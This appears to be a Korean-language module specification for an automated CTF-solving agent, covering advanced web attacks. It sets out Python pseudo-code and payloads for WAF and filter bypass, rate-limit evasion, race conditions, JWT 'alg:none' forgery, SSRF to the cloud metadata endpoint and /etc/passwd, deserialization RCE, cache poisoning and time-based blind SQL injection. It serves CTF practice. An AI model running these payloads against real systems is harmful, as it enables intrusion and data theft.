# Step 2c: 고급 공격 기법

## 전제 조건
- 기본 공격들이 실패함
- 15회 이상 시도 또는 특수 보호 메커니즘 감지

## 목표
고급 기법과 창의적 접근으로 난이도 높은 CTF 해결

## 실행 프로세스

### 2c.1 보호 메커니즘 우회

```python
def bypass_protections(context):
    """WAF, 필터링, Rate Limiting 우회"""
    
    # 1. WAF 우회 기법
    waf_bypass_techniques = {
        'case_variation': lambda p: randomize_case(p),
        'encoding_layers': lambda p: double_url_encode(p),
        'comments_injection': lambda p: add_sql_comments(p),
        'whitespace_variation': lambda p: use_alternative_spaces(p),
        'chunked_payload': lambda p: split_payload(p),
        'http_parameter_pollution': lambda p: duplicate_params(p)
    }
    
    # 2. Rate Limiting 우회
    if 'rate_limit' in context.protection:
        return {
            'strategy': 'slow_attack',
            'delay_between_requests': 5,
            'use_different_sessions': True,
            'rotate_user_agents': True
        }
    
    # 3. 필터 우회
    if 'filtered_keywords' in context:
        filtered = context.filtered_keywords
        bypass_map = {
            'SELECT': 'SeLeCt, SE/**/LECT, %53%45%4C%45%43%54',
            'UNION': 'UNI/**/ON, %55%4E%49%4F%4E',
            'cat': 'c""at, c\\at, /bin/c?t',
            'flag': 'fl""ag, f*lag, fl[a]g'
        }
        return apply_bypass_map(bypass_map, filtered)
```

### 2c.2 Race Condition

```python
def exploit_race_condition(endpoint, params):
    """경쟁 조건 공격"""
    
    import threading
    import time
    
    success_flag = threading.Event()
    result_store = []
    
    def race_request(thread_id):
        """동시 요청 전송"""
        # 쿠폰 사용, 포인트 차감 등의 경쟁 조건
        payloads = [
            {'action': 'withdraw', 'amount': 1000},
            {'action': 'use_coupon', 'code': 'DISCOUNT'},
            {'action': 'transfer', 'to': 'attacker', 'amount': 100}
        ]
        
        for payload in payloads:
            response = send_payload(endpoint, payload)
            if 'success' in response:
                result_store.append(response)
                if 'flag' in response:
                    success_flag.set()
    
    # 다중 스레드로 동시 요청
    threads = []
    for i in range(50):  # 50개 동시 요청
        t = threading.Thread(target=race_request, args=(i,))
        threads.append(t)
    
    # 동시 시작
    for t in threads:
        t.start()
    
    # 결과 대기
    for t in threads:
        t.join(timeout=10)
    
    if success_flag.is_set():
        return extract_flag_from_results(result_store)
```

### 2c.3 Type Juggling & Weak Comparison

```python
def exploit_type_juggling(endpoint, params):
    """PHP/JS 타입 저글링 공격"""
    
    type_confusion_payloads = [
        # PHP Type Juggling
        {'password': True},
        {'password': 0},
        {'password': []},
        {'password': '0e1234'},  # Magic hash
        
        # JSON 이용
        {'username': {'$ne': None}},
        {'role': {'admin': True}},
        
        # Array injection
        {'id[]': ['1', '2', 'admin']},
        
        # Null byte injection
        {'file': 'flag.txt\x00.jpg'}
    ]
    
    for payload in type_confusion_payloads:
        # JSON으로 전송
        response = dreamhack_solver:curl(
            target_url=f"{target_url}{endpoint}",
            method="POST",
            data=json.dumps(payload),
            content_type="application/json"
        )
        
        if check_success(response):
            return response
```

### 2c.4 Session/Cookie 조작

```python
def manipulate_session(context):
    """세션 및 쿠키 조작"""
    
    # 1. JWT 조작
    if 'jwt' in context.cookies:
        original_jwt = context.cookies['jwt']
        
        # JWT 디코딩 (서명 검증 없이)
        header, payload, signature = original_jwt.split('.')
        decoded_payload = base64.b64decode(payload + '==')
        
        # 권한 수정
        modified = json.loads(decoded_payload)
        modified['role'] = 'admin'
        modified['is_admin'] = True
        
        # None 알고리즘 공격
        new_header = base64.b64encode('{"alg":"none","typ":"JWT"}'.encode()).decode().rstrip('=')
        new_payload = base64.b64encode(json.dumps(modified).encode()).decode().rstrip('=')
        crafted_jwt = f"{new_header}.{new_payload}."
        
        return test_with_cookie({'jwt': crafted_jwt})
    
    # 2. 세션 예측
    if 'session_id' in context.cookies:
        session_patterns = analyze_session_pattern(context.previous_sessions)
        predicted_sessions = predict_next_sessions(session_patterns)
        
        for session in predicted_sessions:
            result = test_with_cookie({'session_id': session})
            if 'admin' in result:
                return result
```

### 2c.5 SSRF (Server-Side Request Forgery)

```python
def exploit_ssrf(endpoint, params):
    """SSRF를 통한 내부 시스템 접근"""
    
    ssrf_payloads = [
        # 로컬 파일 읽기
        "file:///flag.txt",
        "file:///etc/passwd",
        
        # 내부 서비스 접근
        "http://localhost/admin",
        "http://127.0.0.1:8080/flag",
        "http://169.254.169.254/latest/meta-data/",
        
        # 프로토콜 체인
        "gopher://localhost:3306/_",
        "dict://localhost:11211/",
        
        # 리다이렉션 우회
        "http://my-server.com/redirect?url=file:///flag.txt"
    ]
    
    for param in params:
        if any(indicator in param for indicator in ['url', 'link', 'path', 'file']):
            for payload in ssrf_payloads:
                response = send_payload(endpoint, {param: payload})
                if 'flag{' in response:
                    return extract_flag(response)
```

### 2c.6 Deserialization 공격

```python
def exploit_deserialization(endpoint, params):
    """역직렬화 취약점 공격"""
    
    # Python Pickle
    python_pickle_payload = create_pickle_rce("cat /flag.txt")
    
    # PHP 직렬화
    php_payload = 'O:8:"FileRead":1:{s:8:"filename";s:9:"/flag.txt";}'
    
    # Java 직렬화
    java_payload = generate_ysoserial_payload("CommonsCollections", "cat /flag.txt")
    
    # Node.js
    nodejs_payload = {
        "__proto__": {
            "isAdmin": True,
            "outputFunctionName": "x;console.log(require('fs').readFileSync('/flag.txt').toString());x"
        }
    }
    
    payloads = [
        ('pickle', python_pickle_payload, 'application/octet-stream'),
        ('php', php_payload, 'application/x-php-serialized'),
        ('java', java_payload, 'application/x-java-serialized-object'),
        ('json', json.dumps(nodejs_payload), 'application/json')
    ]
    
    for name, payload, content_type in payloads:
        response = dreamhack_solver:curl(
            target_url=f"{target_url}{endpoint}",
            method="POST",
            data=payload,
            content_type=content_type
        )
        
        if 'flag{' in response:
            return extract_flag(response)
```

### 2c.7 Cache Poisoning

```python
def exploit_cache_poisoning(context):
    """캐시 포이즈닝 공격"""
    
    # 1. 캐시 키 파악
    cache_headers = ['X-Forwarded-Host', 'X-Original-URL', 'X-Rewrite-URL']
    
    for header in cache_headers:
        # 악성 응답 캐싱
        poison_response = dreamhack_solver:curl(
            target_url=target_url,
            method="GET",
            headers={header: "evil.com/flag"}
        )
        
        # 캐싱된 응답 확인
        victim_response = dreamhack_solver:curl(
            target_url=target_url,
            method="GET"
        )
        
        if 'evil.com' in victim_response:
            return "Cache poisoning successful"
```

### 2c.8 Side Channel 공격

```python
def side_channel_attack(endpoint, param):
    """타이밍 및 에러 기반 정보 추출"""
    
    # 1. 타이밍 공격
    def timing_attack():
        flag = ""
        for pos in range(50):
            timings = {}
            for char in "abcdefghijklmnopqrstuvwxyz0123456789_{}":
                payload = f"' AND SUBSTRING(flag,{pos},1)='{char}' AND SLEEP(0.1)--"
                
                times = []
                for _ in range(3):  # 3번 평균
                    start = time.time()
                    send_payload(endpoint, {param: payload})
                    times.append(time.time() - start)
                
                timings[char] = sum(times) / len(times)
            
            # 가장 오래 걸린 문자가 정답
            correct_char = max(timings, key=timings.get)
            flag += correct_char
            
            if flag.endswith("}"):
                return flag
    
    # 2. 에러 기반 정보 유출
    def error_based_extraction():
        # 다양한 에러 유발
        error_triggers = [
            "1/0",  # Division by zero
            "''[0]",  # Index error
            "int('a')",  # Type error
        ]
        
        for trigger in error_triggers:
            response = send_payload(endpoint, {param: trigger})
            # 스택 트레이스에서 정보 추출
            if 'Traceback' in response or 'Stack trace' in response:
                return extract_info_from_stacktrace(response)
```

## 창의적 접근법

```python
def creative_approaches(context):
    """일반적이지 않은 창의적 공격"""
    
    # 1. 파일명/경로 추측
    creative_paths = [
        "/backup/flag.txt",
        "/.flag",
        "/var/flag",
        "/tmp/flag_" + str(context.timestamp),
        "/home/ctf/flag.txt"
    ]
    
    # 2. 환경 변수 접근
    env_payloads = [
        "${FLAG}",
        "$FLAG",
        "%FLAG%",
        "{{env.FLAG}}"
    ]
    
    # 3. 디버그 모드 악용
    debug_triggers = [
        "?debug=true",
        "?test=1",
        "&_debug=on",
        "#DEBUG"
    ]
    
    # 4. 숨겨진 파라미터
    hidden_params = [
        "admin", "flag", "secret", "backdoor",
        "_debug", "_test", "override", "bypass"
    ]
    
    return test_creative_vectors(creative_paths + env_payloads + debug_triggers)
```

## 출력 형식

### 성공 시
```json
{
  "module": "2c_advanced",
  "status": "SUCCESS",
  "technique": "Race Condition",
  "flag": "flag{...}",
  "key_insight": "Concurrent requests bypassed balance check",
  "attempts_before_success": 47
}
```

### 실패 시
```json
{
  "module": "2c_advanced",
  "status": "FAILURE",
  "tried_techniques": [
    "WAF Bypass",
    "Race Condition", 
    "Type Juggling",
    "SSRF"
  ],
  "observations": [
    "Strong input validation",
    "No timing differences detected",
    "Serialization not used"
  ],
  "final_recommendation": "Manual analysis required"
}
```

## 핵심 원칙

1. **창의성**: 일반적 방법 실패 시 창의적 접근
2. **깊이**: 각 기법을 완전히 탐색
3. **조합**: 여러 취약점 체이닝
4. **인내**: 고급 기법은 시간이 필요
5. **관찰**: 미세한 차이도 놓치지 않기
